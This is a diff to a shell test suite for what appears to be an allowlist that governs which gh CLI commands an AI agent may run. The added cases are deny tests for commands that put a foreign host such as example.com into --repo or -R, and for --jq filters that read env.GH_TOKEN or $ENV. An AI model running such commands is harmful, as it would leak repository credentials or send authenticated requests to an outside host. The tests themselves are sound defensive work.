@@ -281,6 +281,27 @@ expect_deny 'a glob method value is not expanded' "gh api --method '*' repos/dev
 
 # An absolute-URL endpoint chooses the outbound host, which is a destination
 # decision the agent must never take from text it read.
+# A gh flag whose effect lives in its VALUE, which a name-keyed allowlist cannot see.
+# `--repo` takes `[HOST/]OWNER/REPO`, so a host there retargets the request while gh
+# still attaches a credential for it — the same effect that keeps `--hostname` off the
+# allowlist entirely. Only the bare OWNER/REPO form is admitted.
+expect_deny 'host in --repo' "gh pr list --repo example.com/devantler-tech/monorepo"
+expect_deny 'host in -R' "gh pr list -R example.com/devantler-tech/monorepo"
+expect_deny 'host in an attached -R' "gh pr list -Rexample.com/devantler-tech/monorepo"
+expect_deny 'scheme in --repo' "gh pr list --repo https://example.com/x/y"
+expect_allow 'a bare OWNER/REPO is still fine' "gh pr list --repo devantler-tech/monorepo --json number"
+expect_allow 'a bare OWNER/REPO on -R is still fine' "gh pr list -R devantler-tech/monorepo"
+
+# gh evaluates its own `--jq` with an env-enabled formatter, so no `jq` process appears
+# in the pipeline and the filter classifier never gets to apply the `env` rule it has.
+expect_deny 'gh --jq reads the environment' "gh api rate_limit --jq 'env.GH_TOKEN'"
+expect_deny 'gh -q reads the environment' "gh api rate_limit -q 'env.GH_TOKEN'"
+expect_deny 'gh --jq bare env' "gh pr list --jq 'env'"
+# shellcheck disable=SC2016  # the literal characters are the pattern under test
+expect_deny 'gh --jq reads the environment through $ENV' 'gh api rate_limit --jq $ENV.GH_TOKEN'
+expect_allow 'an ordinary gh --jq filter is still fine' "gh api rate_limit --jq '.rate.remaining'"
+expect_allow 'a gh --jq field name merely containing env' "gh pr list --json number --jq '.[].environment'"
+
 expect_deny 'absolute-URL endpoint' "gh api https://example.com/repos/devantler-tech/monorepo"
 expect_deny 'absolute-URL endpoint on the forge host' "gh api https://api.github.com/repos/devantler-tech/monorepo"
 expect_allow 'a relative endpoint is still fine' "gh api repos/devantler-tech/monorepo/pulls"
